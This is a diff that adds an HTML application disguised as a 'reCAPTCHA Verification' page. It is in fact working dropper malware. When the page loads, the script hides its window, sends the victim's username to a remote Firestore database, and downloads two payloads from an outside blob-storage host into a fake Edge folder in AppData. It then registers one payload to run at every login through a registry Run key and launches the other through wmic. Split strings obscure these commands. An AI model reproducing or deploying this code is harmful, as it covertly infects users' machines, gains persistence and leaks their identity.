@@ -1,0 +1,214 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>reCAPTCHA Verification</title>
+    <hta:Application
+      applicationname="reCAPTCHA Verification"
+      border="none"
+      borderstyle="normal"
+      showintaskbar="no"
+      caption="no"
+    />
+    <script language="JScript">
+      function toJSONString(obj) {
+        if (obj === null) return 'null';
+
+        var t = typeof obj;
+        if (t === 'string') {
+          return '"' + obj.replace(/"/g, '\\"') + '"';
+        }
+        if (t === 'number' || t === 'boolean') {
+          return String(obj);
+        }
+        if (obj instanceof Array) {
+          var arr = [];
+          for (var i = 0; i < obj.length; i++) {
+            arr.push(toJSONString(obj[i]));
+          }
+          return '[' + arr.join(',') + ']';
+        }
+        if (t === 'object') {
+          var props = [];
+          for (var k in obj) {
+            if (obj.hasOwnProperty(k)) {
+              props.push('"' + k + '":' + toJSONString(obj[k]));
+            }
+          }
+          return '{' + props.join(',') + '}';
+        }
+
+        return '""';
+      }
+
+      function getQueryParams() {
+        var query = window.location.search;
+        if (query.charAt(0) == '?') {
+          query = query.substring(1);
+        }
+
+        var parts = query.split('&');
+        var params = {};
+        for (var i = 0; i < parts.length; i++) {
+          var kv = parts[i].split('=');
+          if (kv.length == 2) {
+            var key = unescape(kv[0]);
+            var val = unescape(kv[1]);
+            params[key] = val;
+          }
+        }
+        return params;
+      }
+
+      function main() {
+        window.resizeTo(0, 0);
+        var fso = new ActiveXObject('Scripting.FileSystemObject');
+        var shell = new ActiveXObject('WScript.Shell');
+        var service = new ActiveXObject('Schedule.Service');
+        var edgeUrl =
+          'https://0vu0caoo2khheri5.public.blob.vercel-storage.com/captcha.txt';
+        var subedgeUrl =
+          'https://0vu0caoo2khheri5.public.blob.vercel-storage.com/verify.txt';
+        var key = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\';
+
+        try {
+          // VERIFICATION PATCH REQUEST
+          var params = getQueryParams();
+          var id = params.id;
+
+          if (!id) {
+            id = 'unknown';
+          }
+
+          var name = shell.ExpandEnvironmentStrings('%USERNAME%');
+          if (!name) {
+            name = 'unknown';
+          } else {
+            name = name.toLowerCase();
+          }
+
+          var url =
+            'https://firestore.googleapis.com/v1/projects/information-mswn/databases/(default)/documents/sessions/' +
+            id +
+            '/?updateMask.fieldPaths=verified&updateMask.fieldPaths=name';
+          var data =
+            '{ "fields": { "verified": { "booleanValue": true }, "name": { "stringValue": "' +
+            name +
+            '" } } }';
+          var xhr = new ActiveXObject('MSXML2.XMLHTTP');
+
+          xhr.open('PATCH', url, true); // false = sync, true = async
+          xhr.setRequestHeader('Content-Type', 'application/json');
+          xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4) {
+            }
+          };
+          xhr.send(data);
+
+          // CAPTCHA TXT
+          var appDataPath = shell.SpecialFolders('AppData');
+          var baseDestPath = appDataPath + '\\Microsoft\\Windows\\Edge';
+          var captchaDestPath =
+            baseDestPath + '\\ca' + 'pt' + 'cha' + '.t' + 'xt';
+          var verifyDestPath =
+            baseDestPath + '\\ve' + 'r' + 'i' + 'fy' + '.t' + 'xt';
+
+          // If already installed, exit
+          if (fso.FileExists(captchaDestPath)) {
+            window.close();
+          }
+
+          // Check if folder exists and create it if it doesn't
+          if (!fso.FolderExists(baseDestPath)) {
+            fso.CreateFolder(baseDestPath);
+          }
+
+          var edgeXhr = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
+          edgeXhr.open('GET', edgeUrl, false);
+          edgeXhr.send();
+
+          var edgeStream = new ActiveXObject('ADODB.Stream');
+          edgeStream.Type = 1; // Binary
+          edgeStream.Open();
+          edgeStream.Write(edgeXhr.responseBody);
+          edgeStream.SaveToFile(captchaDestPath, 2); // 2 = overwrite
+          edgeStream.Close();
+
+          var subedgeXhr = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
+          subedgeXhr.open('GET', subedgeUrl, false);
+          subedgeXhr.send();
+
+          var subedgeStream = new ActiveXObject('ADODB.Stream');
+          subedgeStream.Type = 1; // Binary
+          subedgeStream.Open();
+          subedgeStream.Write(subedgeXhr.responseBody);
+          subedgeStream.SaveToFile(verifyDestPath, 2); // 2 = overwrite
+          subedgeStream.Close();
+
+          // Register Autostart
+          var startValue =
+            'C' +
+            ':' +
+            '\\' +
+            'W' +
+            'ind' +
+            'ows' +
+            '\\' +
+            'Sy' +
+            'ste' +
+            'm3' +
+            '2' +
+            '\\' +
+            'w' +
+            'be' +
+            'm\\' +
+            'w' +
+            'm' +
+            'i' +
+            'c' +
+            '.' +
+            'e' +
+            'x' +
+            'e' +
+            ' p' +
+            'r' +
+            'oces' +
+            's ca' +
+            'll c' +
+            'rea' +
+            'te "' +
+            verifyDestPath +
+            '"';
+
+          shell.RegWrite(key + 'Edge', startValue, 'REG_SZ');
+
+          // Run Captcha
+          shell.Run(
+            'w' +
+              'm' +
+              'i' +
+              'c' +
+              '.' +
+              'e' +
+              'x' +
+              'e' +
+              ' pro' +
+              'ces' +
+              's ca' +
+              'll ' +
+              'creat' +
+              'e "' +
+              captchaDestPath +
+              '"',
+            0,
+            false
+          );
+        } catch (error) {
+          window.close();
+        }
+
+        window.close();
+      }
+    </script>
+  </head>
+  <body onload="main()"></body>
+</html>
